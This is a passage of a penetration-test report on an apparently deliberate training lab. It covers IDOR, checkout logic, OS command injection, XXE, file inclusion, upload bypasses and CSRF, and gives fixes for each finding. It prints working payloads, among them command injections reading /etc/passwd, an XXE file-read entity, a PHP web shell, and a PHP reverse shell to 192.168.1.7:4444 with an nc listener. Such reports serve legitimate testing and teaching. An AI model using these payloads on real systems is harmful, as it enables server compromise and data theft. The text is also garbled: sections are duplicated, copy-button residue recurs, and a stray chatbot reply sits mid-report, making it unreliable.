An Insecure Direct Object Reference (IDOR) vulnerability was identified in the “About” profile feature of the application. The application uses a client-controlled `userid` value stored in cookies and request parameters to retrieve and update user profile information.

The server does not validate whether the supplied `userid` belongs to the currently authenticated user. By modifying the `userid` value, an authenticated attacker can access and modify another user’s profile information, including personal details such as name, job title, biography, email address, phone number, and location.

#### Root Cause
The application directly references internal user identifiers (`userid`) without enforcing server-side authorization checks. There is no verification to ensure that profile read or update operations are performed only on resources owned by the authenticated user.

#### Proof of Concept
The attacker intercepts the request and observes the following cookie value:

Cookie: PHPSESSID=5cl39m5sql2dcs47k9qlrucft8; userid=4

vbnet
Copy code

By modifying the `userid` value to reference another user:

Cookie: PHPSESSID=5cl39m5sql2dcs47k9qlrucft8; userid=3

css
Copy code

The application successfully loads another user’s profile (“Cedric Kelly”) and allows unauthorized modification of profile details via the following request:

POST /lab/idor/about/saveprofile.php
<img width="957" height="814" alt="about_2" src="https://github.com/user-attachments/assets/2043ff6c-a66a-4070-b5c2-7cfe4b6de756" />
<img width="1920" height="951" alt="about_1" src="https://github.com/user-attachments/assets/cf9e58a8-7ad3-4dc2-a49f-d504525b09e7" />

#### 5.3.7 Business Logic Flaw – Shopping Cart Checkout Validation

#### Severity
High

#### CVSS v3.1 Score
8.0 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)

#### Affected Component
Shopping cart checkout and payment verification workflow.

#### Description
A business logic vulnerability was identified in the shopping cart checkout process. The application allows users to complete purchases even when the total cart value exceeds the available account balance.

During checkout, the application performs insufficient server-side validation of the user’s balance before finalizing the transaction. As a result, an attacker can complete a purchase and force the account balance into a negative value.

Additionally, the application exposes one-time verification codes inside the internal message box, which can be reused or accessed without proper binding to a specific transaction or balance check.

#### Root Cause
The application trusts client-side workflow sequencing and does not enforce strict server-side validation for:
- Account balance checks before purchase completion
- Binding verification codes to a specific transaction, user, or cart state
- Preventing negative balances during checkout

This allows the checkout process to be abused even when logical preconditions are not met.

#### Proof of Concept
The attacker adds multiple high-value items to the shopping cart, exceeding the available balance:

#### 5.3.7 Business Logic Flaw – Shopping Cart Checkout Validation

#### Severity
High

#### CVSS v3.1 Score
8.0 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)

#### Affected Component
Shopping cart checkout and payment verification workflow.

#### Description
A business logic vulnerability was identified in the shopping cart checkout process. The application allows users to complete purchases even when the total cart value exceeds the available account balance.

During checkout, the application performs insufficient server-side validation of the user’s balance before finalizing the transaction. As a result, an attacker can complete a purchase and force the account balance into a negative value.

Additionally, the application exposes one-time verification codes inside the internal message box, which can be reused or accessed without proper binding to a specific transaction or balance check.

#### Root Cause
The application trusts client-side workflow sequencing and does not enforce strict server-side validation for:
- Account balance checks before purchase completion
- Binding verification codes to a specific transaction, user, or cart state
- Preventing negative balances during checkout

This allows the checkout process to be abused even when logical preconditions are not met.

#### Proof of Concept
The attacker adds multiple high-value items to the shopping cart, exceeding the available balance:

Balance: $1000
Cart Total: $1803.98

vbnet
Copy code

When attempting to purchase, the application displays a price error message:

GET /lab/idor/shopping-cart/cart.php?mess=priceError

css
Copy code

Despite the insufficient balance, the attacker proceeds with the checkout flow and submits a valid verification code obtained from the message box:

GET /lab/idor/shopping-cart/3Dvalid.php

css
Copy code

The purchase completes successfully, resulting in a negative balance:
<img width="959" height="998" alt="shopping_cart1" src="https://github.com/user-attachments/assets/74c4241e-806a-4d24-8ec8-c8ae84033ed8" />
<img width="959" height="998" alt="shopping_cart_3" src="https://github.com/user-attachments/assets/835f3d85-9ec9-4504-8289-169814d93d01" />
<img width="959" height="998" alt="shopping_cart_2" src="https://github.com/user-attachments/assets/9ccc0b04-c44b-4110-a570-582afd85a21d" />
<img width="1903" height="958" alt="shopping_cart" src="https://github.com/user-attachments/assets/17c5cac0-c515-4c6d-bda4-8af9f76f42de" />

Balance: -$49.99 

#### 5.4.1 OS Command Injection – Send Ping

#### Severity
Critical

#### CVSS v3.1 Score
9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

#### Affected Component
Ping functionality accepting user-supplied IP address via POST request.

#### Description
An OS Command Injection vulnerability was identified in the Send Ping feature of the application. The application accepts user-supplied input for an IP address and directly passes it to a system-level `ping` command without proper input validation or sanitization.

By injecting shell metacharacters into the input parameter, an attacker can execute arbitrary operating system commands on the underlying server.

The command output is directly returned in the HTTP response, confirming successful command execution.

#### Root Cause
The application constructs system commands using unsanitized user input and executes them via the operating system shell. No input validation, escaping, or allow-listing is implemented before command execution.

#### Proof of Concept
A malicious payload is injected into the `ip` parameter using command separators.

**Payload to read system users:**
ip=127.0.0.1;cat /etc/passwd

pgsql
Copy code

The server responds with the contents of `/etc/passwd`, confirming command execution.

**Payload to identify execution context:**
ip=127.0.0.1;whoami

sql
Copy code

The response returns:
www-data
<img width="963" height="922" alt="send_ping1" src="https://github.com/user-attachments/assets/b116cbe3-3e32-4672-8698-f49de7e50ec1" />
<img width="957" height="890" alt="send_ping" src="https://github.com/user-attachments/assets/e4ec230d-f295-4c0d-988f-ccfb56b0b835" />

#### 5.4.2 Send Ping (Filter) – Command Injection (Not Exploitable)

#### Severity
Low

#### CVSS v3.1 Score
2.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L)

#### Affected Component
Filtered ping functionality accepting IP address input via POST request.

#### Description
The Send Ping (Filter) functionality was tested for OS Command Injection vulnerabilities by supplying various command injection payloads using shell metacharacters, command separators, and command substitution techniques.

Unlike the unfiltered ping functionality, this endpoint implements input filtering and validation mechanisms that restrict user input to valid IP address formats. As a result, attempts to inject additional operating system commands do not lead to arbitrary command execution.

The application only executes the intended `ping` command and does not return output from injected payloads.

#### Root Cause
The application enforces input validation and filtering on the `ip` parameter, preventing command separators and shell metacharacters from reaching the operating system shell. This effectively mitigates OS command injection attempts.

#### Proof of Concept
The following payloads were tested and did not result in command execution:

**Attempted command injection:**
ip=127.0.0.1;id

bash
Copy code

**Attempted command substitution:**
ip=127.0.0.1$(id)

cpp
Copy code

**Attempted logical operator injection:**
ip=127.0.0.1 && whoami

markdown
Copy code

All payloads resulted in either:
- Normal ping output, or
- Input being sanitized and treated as a literal IP address

No command output was returned, confirming that command injection is not exploitable.
<img width="953" height="1028" alt="send_ping_filtered1" src="https://github.com/user-attachments/assets/80194ea4-34cb-4e3e-b051-733fc9e260d0" />
<img width="949" height="864" alt="send_ping_filtered" src="https://github.com/user-attachments/assets/dc45949c-e56d-4047-90c9-24b319d0ca78" />


#### Impact
- No unauthorized command execution possible
- No data exposure or system compromise observed
- Minimal impact limited to intended ping functionality

#### Recommendation
- Maintain strict allow-list validation for IP address inputs
- Avoid passing user input directly to shell commands
- Prefer native language networking libraries over shell execution
- Continue implementing server-side input validation and encoding

#### 5.4.3 OS Command Injection – Stock Control

#### Severity
Critical

#### CVSS v3.1 Score
9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

#### Affected Component
Stock control functionality accepting `product_id` parameter via GET request.

#### Description
An OS Command Injection vulnerability was identified in the Stock Control feature of the application. The application uses the `product_id` parameter from a GET request to check product stock levels. This parameter is directly incorporated into a system-level command without proper input validation or sanitization.

By injecting shell metacharacters into the `product_id` parameter, an attacker can execute arbitrary operating system commands on the underlying server. The command output is reflected in the HTTP response, confirming successful command execution.

#### Root Cause
The application constructs and executes system commands using unsanitized user input received via the `product_id` parameter. There is no allow-list validation, escaping, or secure command execution mechanism in place to prevent command injection.

#### Proof of Concept
A normal stock check request uses a valid product identifier:

GET /lab/command-injection/stock-check/?product_id=2

powershell
Copy code

By injecting an operating system command using a command separator:

GET /lab/command-injection/stock-check/?product_id=1;id

bash
Copy code

The server responds with command output:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

vbnet
Copy code

Further confirmation is obtained by attempting to read system files:

GET /lab/command-injection/stock-check/?product_id=1;pwd

pgsql
Copy code

The response reveals server-side directory information, confirming arbitrary command execution.

<img width="1881" height="841" alt="stock_control1" src="https://github.com/user-attachments/assets/248becb6-ba9f-4415-bf86-5157524d9ea7" />
<img width="1884" height="852" alt="stock_control" src="https://github.com/user-attachments/assets/dedb09fb-7d8e-440d-bb29-6e49b89caa8a" />


#### Impact
- Remote execution of arbitrary operating system commands
- Disclosure of sensitive system information
- Potential full server compromise
- Ability to pivot to further attacks within the environment

#### Recommendation
- Never pass user-supplied input directly to system commands
- Implement strict allow-list validation for expected parameter values
- Use safe language-native APIs instead of shell execution
- Apply least-privilege execution for web server processes
- Implement centralized input validation and security logging

#### 5.4.4 Blind OS Command Injection – Blind Command Execution

#### Severity
High

#### CVSS v3.1 Score
8.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H)

#### Affected Component
Blind command execution functionality processing user-controlled input via HTTP headers.

#### Description
A Blind OS Command Injection vulnerability was identified in the blind command injection functionality of the application. The application processes user-supplied input from HTTP headers and passes it to an operating system command using a shell execution function.

Unlike standard command injection, the output of injected commands is not directly returned in the HTTP response. However, injected commands are still executed on the server, which can be confirmed using timing-based techniques.

This confirms that arbitrary OS command execution is possible even though command output is not reflected.

#### Root Cause
The application passes attacker-controlled input into a system command execution function without proper sanitization or validation. Although command output is not displayed, the injected commands are still executed by the operating system shell.

#### Proof of Concept
A baseline request is sent to measure the normal server response time:

```bash
curl -s -o /dev/null -w "Baseline time: %{time_total}\n" \
-H "User-Agent: Mozilla/5.0" \
http://localhost:1337/lab/command-injection/blind-command-injection/blind.php
```
A malicious payload is then injected via the User-Agent header to introduce a delay:

bash
Copy code
curl -s -o /dev/null -w "Injected time: %{time_total}\n" \
-H "User-Agent: Mozilla/5.0; sleep 5" \
http://localhost:1337/lab/command-injection/blind-command-injection/blind.php
The response time increases significantly compared to the baseline request, confirming that the injected command was executed on the server.
<img width="960" height="349" alt="blind_command_injection" src="https://github.com/user-attachments/assets/4a7db2e6-5b58-4646-ad69-4a510679d360" />



Impact
Execution of arbitrary OS commands without output visibility
Potential denial of service via resource exhaustion
Ability to chain further attacks such as persistence or lateral movement
High risk despite lack of direct output

Recommendation
Never pass user-controlled input to shell execution functions
Avoid using system calls such as exec(), system(), or backticks
Implement strict allow-list validation for all inputs
Use language-native APIs instead of shell commands
Apply least-privilege execution for web server processes
Implement security monitoring for abnormal execution delays

#### 5.5.1 XML External Entity (XXE) Injection

#### Severity
High

#### CVSS v3.1 Score
8.6 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

#### Affected Component
XML processing functionality accepting user-supplied XML input via POST request.

#### Description
An XML External Entity (XXE) vulnerability was identified in the XML parsing functionality of the application. The application processes user-supplied XML data and allows the use of a `DOCTYPE` declaration with external entity definitions.

The XML parser is configured insecurely, allowing external entities to be defined and expanded during XML parsing. This enables an attacker to read arbitrary files from the server by referencing local system resources as external entities.

The vulnerability was confirmed through both entity reflection and successful disclosure of sensitive system files.

#### Root Cause
The application uses an XML parser with external entity processing enabled. There are no security controls in place to disable `DOCTYPE` declarations or external entity resolution, allowing attacker-controlled entities to be expanded during parsing.

#### Proof of Concept

**Step 1: Confirm entity expansion**
```xml
<?xml version="1.0"?>
<!DOCTYPE city [
  <!ENTITY test "XXE_WORKING">
]>
<city>
  <title>&test;</title>
  <amount>293</amount>
</city>
```
Response:

XXE_WORKING 293
This confirms that user-defined XML entities are processed by the server.

Step 2: Read sensitive server file (/etc/passwd)

xml
<?xml version="1.0"?>
<!DOCTYPE city [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<city>
  <title>&xxe;</title>
  <amount>293</amount>
</city>
Response:

ruby
Copy code
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
mysql:x:101:102:MySQL Server:/nonexistent:/bin/false
This confirms arbitrary file disclosure via XXE.

<img src="https://github.com/user-attachments/assets/xxe_file_disclosure.png" /> <img src="https://github.com/user-attachments/assets/xxe_entity_confirmation.png" />
Impact
Disclosure of sensitive server-side files
Exposure of system users and service accounts
Potential reconnaissance for further attacks
Increased risk of server compromise

Recommendation
Disable external entity resolution in XML parsers
Disallow DOCTYPE declarations entirely if not required
Use secure XML parser configurations (libxml_disable_entity_loader, XMLConstants.FEATURE_SECURE_PROCESSING)
Validate and sanitize all XML input
Prefer data formats such as JSON where possible
<img width="956" height="904" alt="xml_external_Entity1" src="https://github.com/user-attachments/assets/38680924-728a-4aeb-b309-3c4ff9ef46ec" />
<img width="954" height="816" alt="xml_external_entitity" src="https://github.com/user-attachments/assets/6aba063f-3119-4787-ac5f-b818e143dd46" />

#### 5.6.1 Local File Inclusion (LFI) – Learn the Capital

#### Severity
High

#### CVSS v3.1 Score
7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

#### Affected Component
Country selection functionality using the `country` GET parameter.

#### Description
A Local File Inclusion (LFI) vulnerability was identified in the “Learn the Capital” feature of the application. The application uses the `country` parameter from a GET request to dynamically include server-side files.

The parameter is not properly validated or sanitized, allowing an attacker to perform directory traversal and include arbitrary local files. By manipulating the `country` parameter, sensitive internal files such as administrative pages can be accessed without authorization.

#### Root Cause
The application directly uses user-supplied input in a file inclusion function without enforcing strict allow-list validation. There are no controls in place to prevent directory traversal sequences or unauthorized file inclusion.

#### Proof of Concept
A legitimate request uses a valid country value:

GET /lab/file-inclusion/learn-the-capital-1/index.php?country=france.php

css
Copy code

By manipulating the `country` parameter to include a parent directory reference:

GET /lab/file-inclusion/learn-the-capital-1/index.php?country=../admin.php

css
Copy code

The application successfully includes the administrative page and displays the following message:

Welcome to the Admin page..

pgsql
Copy code

This confirms unauthorized local file inclusion.

#### Impact
- Unauthorized access to internal application files
- Exposure of administrative functionality
- Potential disclosure of sensitive configuration or source code
- Increased attack surface for further exploitation

#### Recommendation
- Avoid dynamic file inclusion based on user input
- Implement strict allow-list validation for allowed file names
- Normalize and validate file paths before inclusion
- Disable directory traversal sequences (`../`)
- Use static routing or mapping logic instead of file includes
<img width="954" height="900" alt="capital1" src="https://github.com/user-attachments/assets/cbb53347-11fe-4be9-b82d-4ca7b694d4d1" />
<img width="1036" height="342" alt="capital" src="https://github.com/user-attachments/assets/28201fc0-8199-4093-9757-736ffd476a8b" />

#### 5.6.2 Local File Inclusion (LFI) – Learn the Capital (Variant 2)

#### Severity
High

#### CVSS v3.1 Score
7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

#### Affected Component
Country selection functionality in “Learn the Capital – 2” using the `country` GET parameter.

#### Description
A Local File Inclusion (LFI) vulnerability was identified in the second variant of the “Learn the Capital” feature. The application dynamically includes server-side files based on the value of the `country` parameter supplied in the URL.

The application fails to properly validate or sanitize the parameter, allowing an attacker to perform directory traversal and include arbitrary local files. This results in unauthorized access to internal application files, including administrative pages.

#### Root Cause
The application directly uses the `country` parameter in a file inclusion mechanism without enforcing strict allow-list validation. Directory traversal sequences such as `../` are not filtered or normalized before file inclusion.

#### Proof of Concept
A normal request using a valid country value:

GET /lab/file-inclusion/learn-the-capital-2/index.php?country=france.php

csharp
Copy code

By manipulating the parameter to traverse directories and include an internal file:

GET /lab/file-inclusion/learn-the-capital-2/index.php?country=../../admin.php

css
Copy code

The application successfully includes the administrative page and displays:

Welcome to the Admin page..

markdown
Copy code

This confirms the presence of a Local File Inclusion vulnerability.

#### Impact
- Unauthorized access to internal application files
- Exposure of administrative functionality
- Potential disclosure of sensitive source code or configuration files
- Increased risk of further exploitation

#### Recommendation
- Avoid including files dynamically based on user input
- Implement strict allow-list validation for permitted file names
- Normalize file paths before inclusion
- Block directory traversal patterns such as `../`
- Use static routing or controller-based logic instead of file inclusion

<img width="957" height="819" alt="find_capital_A2" src="https://github.com/user-attachments/assets/a8c81208-aaa6-4e5d-841e-b9fa56bc7519" />
<img width="961" height="383" alt="find_capital_A" src="https://github.com/user-attachments/assets/36eea185-b8d1-4501-8802-6dd30e98f0ba" />

#### 5.6.3 Local File Inclusion (LFI) – Learn the Capital (Filter Bypass)

#### Severity
High

#### CVSS v3.1 Score
7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

#### Affected Component
Country selection functionality in “Learn the Capital – 3” using the `country` GET parameter.

#### Description
A Local File Inclusion (LFI) vulnerability was identified in the third variant of the “Learn the Capital” feature. This version attempts to implement input filtering to prevent arbitrary file inclusion.

However, the filtering logic is improperly implemented and can be bypassed using crafted input. By abusing the file path structure, an attacker can traverse directories and include unauthorized local files, including administrative pages.

Despite the presence of filtering, the application still processes attacker-controlled paths and includes unintended server-side files.

#### Root Cause
The application relies on insufficient blacklist-based filtering to prevent file inclusion attacks. The filtering logic fails to properly normalize and validate file paths before inclusion, allowing directory traversal sequences to bypass restrictions.

The use of partial string checks instead of strict allow-list validation results in ineffective protection.

#### Proof of Concept
A normal request using a valid country value:

GET /lab/file-inclusion/learn-the-capital-3/index.php?country=france.php

pgsql
Copy code

By abusing the filter logic with a crafted path:

GET /lab/file-inclusion/learn-the-capital-3/index.php?country=file/../../admin.php

css
Copy code

The application successfully includes the administrative page and displays:

Welcome to the Admin page..

pgsql
Copy code

This confirms that the file inclusion filter can be bypassed.

#### Impact
- Unauthorized access to internal application files
- Exposure of administrative functionality
- Demonstrates ineffective security controls
- Potential disclosure of sensitive source code or configuration files

#### Recommendation
- Do not rely on blacklist-based filtering for file inclusion protection
- Implement strict allow-list validation for allowed file names
- Resolve and normalize file paths before inclusion
- Reject any input containing directory traversal patterns
- Replace dynamic file inclusion with static routing logic
<img width="923" height="819" alt="find_capital_B" src="https://github.com/user-attachments/assets/e4accf5c-04ff-4fa3-b083-d060973be9f3" />


#### 5.7.1 Unrestricted File Upload – Arbitrary File Upload

#### Severity
Critical

#### CVSS v3.1 Score
9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

#### Affected Component
File upload functionality in the “Unrestricted” upload feature.

#### Description
An Unrestricted File Upload vulnerability was identified in the file upload functionality of the application. Although the interface claims to allow only image formats (gif, jpg, jpeg, png), the application does not enforce any server-side validation on uploaded files.

As a result, an attacker can upload arbitrary files, including executable server-side scripts. The uploaded files are stored in a web-accessible directory and can be directly accessed and executed by the server.

This allows attackers to upload a malicious PHP web shell and achieve remote code execution on the server.

#### Root Cause
The application fails to implement proper server-side file validation. It relies solely on client-side restrictions or file extension hints, without validating:
- File type
- File extension
- MIME type
- Executable content

Additionally, uploaded files are stored inside a web-accessible directory with execution permissions enabled.

#### Proof of Concept
A malicious PHP web shell is uploaded using the file upload functionality:

```php
<?php system($_GET['cmd']); ?>
```
The application confirms successful upload and displays the file path:

bash
Copy code
uploads/shell.php
By accessing the uploaded file directly in the browser:

bash
Copy code
http://localhost:1337/uploads/shell.php?cmd=id
The command is executed on the server, confirming remote code execution.
<img width="743" height="782" alt="unristricted" src="https://github.com/user-attachments/assets/c661d37d-e567-4fb9-b0c2-253c3016905d" />


Impact
Remote code execution on the server

Full compromise of application and hosting environment
Ability to read, modify, or delete server files
Potential lateral movement within the network
Complete loss of confidentiality, integrity, and availability

Recommendation
Implement strict server-side validation of uploaded files
Enforce allow-list validation on file extensions and MIME types
Rename uploaded files and remove executable permissions
Store uploads outside the web root

#### 5.7.2 Insecure File Upload – MIME Type Validation Bypass

#### Severity
High

#### CVSS v3.1 Score
8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

#### Affected Component
File upload functionality using MIME type validation.

#### Description
An insecure file upload vulnerability was identified in the MIME Type–based file upload functionality of the application. The application attempts to restrict uploads by validating the `Content-Type` header of uploaded files and only allows specific MIME types (gif, jpg, jpeg, png).

However, MIME type validation is performed solely based on the client-supplied `Content-Type` header, which can be manipulated by an attacker. Since the server does not verify the actual file content or enforce strict server-side validation, this approach is insufficient to prevent malicious file uploads.

Although direct upload of executable files is blocked when an invalid MIME type is detected, relying on client-controlled headers makes the protection weak and bypassable in real-world scenarios.

#### Root Cause
The application trusts the client-supplied `Content-Type` header for file validation. No content-based inspection, extension validation, or execution restriction is applied on the server side.

This results in ineffective protection against malicious file uploads.

#### Proof of Concept
A normal image upload uses a valid MIME type:

Content-Type: image/png

vbnet
Copy code

When attempting to upload a PHP file with an invalid MIME type:

Content-Type: application/x-php

csharp
Copy code

The application rejects the upload with the following message:

Unauthorized file type found.
Please upload gif, jpg, jpeg or png.

pgsql
Copy code

This confirms that MIME type validation is present but relies solely on client-controlled headers.

<img width="959" height="890" alt="MIME_type" src="https://github.com/user-attachments/assets/d2020789-75f5-49be-adf5-c7fc733a3d25" />
<img width="960" height="1044" alt="MIME_type2" src="https://github.com/user-attachments/assets/0c5cd671-2b36-4b52-8275-3bb5e9d6dcb2" />
<img width="1920" height="877" alt="MIME_type1" src="https://github.com/user-attachments/assets/5274e112-4456-44f7-b500-a7ef3ef29b68" />


#### Impact
- File upload protection can be bypassed in real-world scenarios
- Risk of malicious file upload if combined with extension spoofing or polyglot files
- Potential path to remote code execution
- False sense of security due to weak validation logic

#### Recommendation
- Do not rely on client-supplied MIME types for validation
- Implement strict allow-list validation on file extensions
- Perform server-side content inspection (magic bytes)
- Rename uploaded files and remove executable permissions
- Store uploaded files outside the web root
- Disable script execution in upload directories

#### 5.7.3 Insecure File Upload – Magic Header Validation Bypass

#### Severity
Critical

#### CVSS v3.1 Score
9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

#### Affected Component
File upload functionality using magic header (file signature) validation.

#### Description
An insecure file upload vulnerability was identified in the Magic Header–based upload functionality of the application. The application attempts to validate uploaded files by checking their file signatures (magic bytes) to ensure that only image files are accepted.

However, the validation mechanism only checks the presence of image magic headers (e.g., `GIF87a`) and does not validate the complete file content. By crafting a polyglot file that starts with valid image magic bytes followed by executable PHP code, an attacker can bypass the file validation logic.

The uploaded file is stored in a web-accessible directory and executed by the server, resulting in remote code execution.

#### Root Cause
The application relies solely on magic header validation to determine file legitimacy. It does not:
- Validate the full file structure
- Restrict executable file extensions
- Disable script execution in the upload directory

This allows attackers to upload polyglot files that pass validation while containing malicious executable code.

#### Proof of Concept
A malicious PHP reverse shell is crafted with valid image magic bytes at the beginning:

```php
GIF87a
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.7/4444 0>&1'");
?>
```
The file is uploaded successfully and stored as:

bash
Copy code
uploads/shell.php
A listener is started on the attacker machine:

bash
Copy code
nc -lvnp 4444
When the uploaded file is accessed, a reverse shell connection is received:

kotlin
Copy code
uid=33(www-data) gid=33(www-data) groups=33(www-data)
This confirms successful remote code execution.

Impact
Full remote code execution on the web server

Complete compromise of application and hosting environment

Ability to execute arbitrary system commands

Potential lateral movement and data exfiltration

Loss of confidentiality, integrity, and availability

Recommendation
Do not rely solely on magic header validation

Enforce strict allow-list validation on file extensions

Perform deep content inspection of uploaded files

Rename uploaded files and remove executable extensions

Store uploads outside the web root

Disable script execution in upload directories

Apply least-privilege permissions to web server processes
<img width="946" height="330" alt="magic_header1" src="https://github.com/user-attachments/assets/264c6028-0aa6-4b03-905b-c32fbc7f9b16" />
<img width="1912" height="996" alt="Magic_header" src="https://github.com/user-attachments/assets/abb3d63d-cc68-4e32-81af-630ab58da497" />

#### 5.7.4 Blacklist-Based File Upload Bypass – Extension Manipulation

#### Severity
High

#### CVSS v3.1 Score
8.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L)

#### Affected Component
File upload functionality using blacklist-based extension filtering.

#### Description
A blacklist-based file upload vulnerability was identified in the application where only specific file extensions are blocked instead of enforcing a strict allowlist. The application attempts to prevent malicious uploads by blacklisting certain executable extensions such as `.php`.

However, this approach can be bypassed by using alternative executable extensions such as `.phtml`, which are still interpreted by the web server as PHP files. The application fails to validate the actual execution context of uploaded files and stores them in a web-accessible directory.

As a result, an attacker can upload a PHP payload using a non-blacklisted extension and achieve server-side code execution.

#### Root Cause
The application relies on a blacklist approach for file extension validation rather than a strict allowlist. It does not account for alternative executable extensions supported by the server (e.g., `.phtml`, `.php5`).

#### Proof of Concept
A PHP reverse shell is uploaded using a bypassed extension:

Filename: shell.phtml
Content-Type: application/x-php

csharp
Copy code

The file upload is accepted successfully and stored at:

uploads/shell.phtml
<img width="953" height="1035" alt="Blacklist_11" src="https://github.com/user-attachments/assets/c4a111c0-7c2c-49b4-bc7e-950385cd1d6c" />
<img width="1920" height="1002" alt="Blacklist_1" src="https://github.com/user-attachments/assets/1d7a7698-0722-4d60-ae05-5b0909181594" />


markdown
Copy code

When accessed via the browser, the payload executes on the server, confirming code execution.

#### Impact
- Server-side code execution
- Unauthorized command execution
- Potential full compromise of the application
- Loss of confidentiality and integrity

#### Recommendation
- Use a strict allowlist for file extensions
- Reject all executable extensions regardless of blacklist
- Store uploaded files outside the web root
- Disable script execution in upload directories
- Validate files using multiple layers (extension, MIME, content inspection)
#### 5.7.5 Blacklist-Based File Upload Bypass – Server Configuration Injection

#### Severity
Critical

#### CVSS v3.1 Score
9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

#### Affected Component
File upload functionality allowing upload of server configuration files.

#### Description
A critical file upload vulnerability was identified in the application where blacklist-based filtering fails to block server configuration files such as `.htaccess`. The application allows unrestricted upload of `.htaccess` files into a web-accessible directory.

By uploading a malicious `.htaccess` file, an attacker can modify the server’s execution behavior and force the web server to treat custom file extensions as executable PHP files.

This misconfiguration allows a second-stage payload to be uploaded and executed, leading to full remote code execution.

#### Root Cause
The application does not restrict uploads of server configuration files and relies solely on extension blacklisting. It also allows execution rules to be modified within the uploads directory.

#### Proof of Concept
A malicious `.htaccess` file is uploaded containing:

```
AddType application/x-httpd-php .evil
The file is stored as:
```

bash
Copy code
uploads/.htaccess
A PHP reverse shell is then uploaded with a custom extension:

Copy code
shell.php.evil
The file is successfully executed by accessing it through the browser, resulting in a reverse shell connection as www-data.

Impact
Full remote code execution

Complete compromise of the web server

Ability to modify server behavior

High risk of lateral movement and persistence

Complete loss of confidentiality, integrity, and availability

Recommendation
Block uploads of server configuration files (e.g., .htaccess)

Disable AllowOverride for upload directories

Enforce strict allowlist validation

Store uploads outside the web root

Prevent execution permissions in upload directories<img width="952" height="895" alt="blacklist23" src="https://github.com/user-attachments/assets/4f7c5df8-4189-4c80-9268-50e0a62934be" />
<img width="959" height="828" alt="blacklist22" src="https://github.com/user-attachments/assets/82c5cce0-49fd-4a26-9994-626501b642cc" />
<img width="413" height="163" alt="blacklist21" src="https://github.com/user-attachments/assets/d3823d1b-0931-40ef-a8d3-ceaa5666010b" />

### 5.8.1 CSRF – Changing Admin Password
Vulnerability Description

The application allows password changes through a state-changing request without implementing CSRF protection mechanisms. An authenticated admin user can be forced to change their password by visiting a crafted malicious URL.

Affected Functionality

Password change functionality

Proof of Concept (PoC)

An attacker crafts the following GET request and tricks the admin into opening it:

GET /lab/csrf/changing-password/index.php?new_password=admin&confirm_password=admin


When the admin visits this link while logged in, the password is changed without any confirmation or CSRF token validation.

Impact

Unauthorized password change of the admin account

Complete account takeover

Privilege escalation

Root Cause

State-changing operation allowed via GET request

Absence of CSRF tokens

No Origin or Referer validation

5.8.2 CSRF – Unauthorized Money Transfer
Vulnerability Description

The money transfer functionality processes requests without CSRF protection, allowing attackers to force authenticated users to transfer funds without authorization.

Affected Functionality

Money transfer feature

Proof of Concept (PoC)

The following crafted GET request was used:

GET /lab/csrf/money-transfer/index.php?transfer_amount=2000&receiver=admin


When an authenticated admin user accesses this link, money is transferred without explicit approval.

Impact

Unauthorized financial transactions

Manipulation of account balances

Potential financial loss

Root Cause

Missing CSRF token validation

Sensitive actions performed via GET requests

No user interaction verification

5.8.3 CSRF – Forced Follow Action
Vulnerability Description

The application allows users to follow accounts via a GET request without CSRF protection, enabling attackers to force follow actions.

Affected Functionality

Follow user feature

Proof of Concept (PoC)

An attacker can use the following request:

GET /lab/csrf/follow/index.php?follow=follow


If a logged-in user visits this URL, the follow action is executed automatically.

Impact

Unauthorized social interactions

Manipulation of user relationships

Loss of user trust

Root Cause

CSRF-prone GET requests

No anti-CSRF tokens

Missing Origin/Referer checks

✅ Status

All three CSRF vulnerabilities were successfully exploited, confirming the absence of CSRF protections across multiple sensitive functionalities.

If you want, next I can:

Add CVSS 3.1 scores for all three

Merge them into one combined CSRF finding (recommended for reports)

Convert this directly into SysReptor-ready format
<img width="961" height="817" alt="changing_password_csrf" src="https://github.com/user-attachments/assets/2b231ef7-d063-418a-9066-d0e8093bd4cb" />
<img width="958" height="945" alt="changing_password_csrf2" src="https://github.com/user-attachments/assets/1635b6ca-2c55-46c2-aa4e-2409db4345ec" />
<img width="959" height="945" alt="changing_password_csrf1" src="https://github.com/user-attachments/assets/ccce643b-4b47-49c2-8875-d25ad87a3c99" />



## 5.8.2 CSRF – Unauthorized Money Transfer

### Vulnerability Description
The money transfer feature does not implement CSRF protection, allowing attackers to initiate unauthorized fund transfers on behalf of authenticated users.

### Affected Functionality
- Money Transfer

### Proof of Concept (PoC)
The following crafted GET request was used:

GET /lab/csrf/money-transfer/index.php?transfer_amount=2000&receiver=admin

yaml
Copy code

If an authenticated admin user visits this URL, money is transferred without explicit consent.

### Impact
- Unauthorized financial transactions
- Manipulation of account balances
- Potential financial loss

### Root Cause
- No CSRF token validation
- Sensitive operation allowed via GET request
- Lack of user intent verification

---
<img width="959" height="862" alt="money_transfer_csrf2" src="https://github.com/user-attachments/assets/28e68e57-7bc2-44cd-892a-6bc00958d9b2" />
<img width="350" height="447" alt="money_transfer_csrf1" src="https://github.com/user-attachments/assets/31a0d92b-e5f6-4fae-bf42-8cb1aa6774d6" />
<img width="959" height="952" alt="money_transfer_csrf" src="https://github.com/user-attachments/assets/b2a911d4-4743-4b5a-a918-fef295fd1a5e" />

## 5.8.3 CSRF – Forced Follow Action

### Vulnerability Description
